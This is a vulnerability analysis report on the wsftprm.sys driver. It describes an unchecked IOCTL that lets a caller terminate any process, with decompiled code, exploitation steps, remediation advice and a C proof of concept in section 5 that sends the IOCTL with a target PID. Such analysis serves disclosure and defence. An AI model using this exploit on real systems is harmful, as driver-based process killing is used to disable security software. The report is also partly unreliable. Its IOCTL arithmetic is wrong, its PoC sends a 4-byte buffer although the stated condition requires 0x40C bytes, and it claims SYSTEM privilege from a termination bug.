# wsftprm.sys BYOVD Vulnerability Analysis Report

## 1. Overview

**File**: wsftprm.sys  
**Architecture**: x64 (metapc-64)  
**Analysis Date**: 2024

## 2. Dangerous API Imports

The driver imports the following dangerous functions:

| Function | Purpose | Risk |
|----------|---------|------|
| ZwTerminateProcess | Terminate Process | Can terminate arbitrary processes |
| ZwOpenProcess | Open Process Handle | Can open arbitrary processes |
| PsSetLoadImageNotifyRoutine | Load Image Callback | Can monitor process/module loading |
| PsSetCreateProcessNotifyRoutine | Create Process Callback | Can monitor process creation |

## 3. Vulnerability Details

### 3.1 Arbitrary Process Termination Vulnerability

#### Vulnerability Function
- **Address**: `0x140002848`
- **Function Name**: `sub_140002848`

#### Function Analysis
```c
__int64 __fastcall sub_140002848(unsigned int UniqueProcess)
{
  NTSTATUS v1;
  HANDLE ProcessHandle = 0;
  
  // Set object attributes (NO PRIVILEGE CHECK)
  ObjectAttributes_.Length = 48;
  ObjectAttributes_.Attributes = 514;
  
  // Build CLIENT_ID with arbitrary PID
  ClientId_.UniqueProcess = (HANDLE)UniqueProcess;
  ClientId_.UniqueThread = 0;
  
  // Open ANY process - access rights 0x1FFFFF (maximum)
  v1 = ZwOpenProcess(&ProcessHandle, 0x1FFFFFu, &ObjectAttributes_, &ClientId_);
  
  if (v1 >= 0 && ProcessHandle)
  {
    // Terminate process
    v1 = ZwTerminateProcess(ProcessHandle, 0);
    ZwClose(ProcessHandle);
  }
  return v1;
}
```

#### Call Chain
1. **IRP Dispatch Function**: `sub_140001540` (IRP_MJ_DEVICE_CONTROL)
2. **IOCTL Handler**: `0x22203C` (calculated: 0x222020 - 0x18 + 4 = 0x22203C)
3. **Termination Function**: `sub_14000264C` -> `sub_140002848`

### 3.2 IOCTL Code Analysis

In `sub_140001540`, when IOCTL code is `0x22203C` and input buffer size is `0x40C` (1036 bytes):

```c
// In sub_140001540
n4_1 = v10 - 16;  // n4_1 == 4
if (n4_1 == 4 && v6[4] == 0x40C)  // v6[4] is input buffer size
{
    // ... copy data to v39 ...
    v15 = sub_14000264C(v41, v42);  // Call terminate process function
}
```

### 3.3 Missing Privilege Checks

The driver is COMPLETELY MISSING the following security checks:
- NO caller privilege verification
- NO process whitelist/blacklist
- NO specific PID range restriction
- NO token privilege check
- NO verification if caller is a system process

### 3.4 Exploitation Conditions

To exploit this vulnerability, an attacker needs:
1. **Basic Requirement**: Ability to communicate with driver device (usually requires admin privileges or SeDevicePrivileges)
2. **Exploitation Method**: 
   - Open device object
   - Construct IOCTL request (0x22203C)
   - Set target PID in input buffer
   - Send DeviceIoControl request
3. **Impact**: Can terminate any process on the system, including critical system processes

## 4. Risk Assessment

| Assessment | Score |
|------------|-------|
| Vulnerability Severity | **CRITICAL** |
| Exploitation Complexity | Low |
| Impact Scope | Local |
| Post-Exploitation Privilege | SYSTEM |
| Exploitability | High |

## 5. Proof of Concept (PoC)

```c
// Terminate specified PID process
#include <windows.h>

#define IOCTL_TERMINATE_PROCESS 0x22203C

int main()
{
    HANDLE hDevice = CreateFileW(
        L"\\\\.\\wsftprm",  // Device name may vary
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_EXISTING, 0, NULL);
    
    if (hDevice == INVALID_HANDLE_VALUE) return -1;
    
    DWORD pid = 1234;  // Target PID
    DWORD bytesReturned = 0;
    
    // Send IOCTL request to terminate process
    DeviceIoControl(hDevice, IOCTL_TERMINATE_PROCESS,
                     &pid, sizeof(pid), NULL, 0, &bytesReturned, NULL);
    
    CloseHandle(hDevice);
    return 0;
}
```

## 6. Conclusion

**wsftprm.sys contains a serious BYOVD (Bring Your Own Vulnerable Driver) vulnerability**

The driver provides arbitrary process termination functionality without any privilege checks. Attackers can use this vulnerability to terminate any user-mode process or even critical system processes. This is completely consistent with known malicious driver behavior.

## 7. Remediation Recommendations

1. **Add Caller Verification**: Check if caller has privilege to terminate processes
2. **Process Whitelist**: Only allow terminating specific whitelisted processes
3. **Remove Dangerous Functionality**: If not required for security product, remove this functionality
4. **Access Control**: Use `SeDebugPrivilege` or similar mechanism to verify privileges
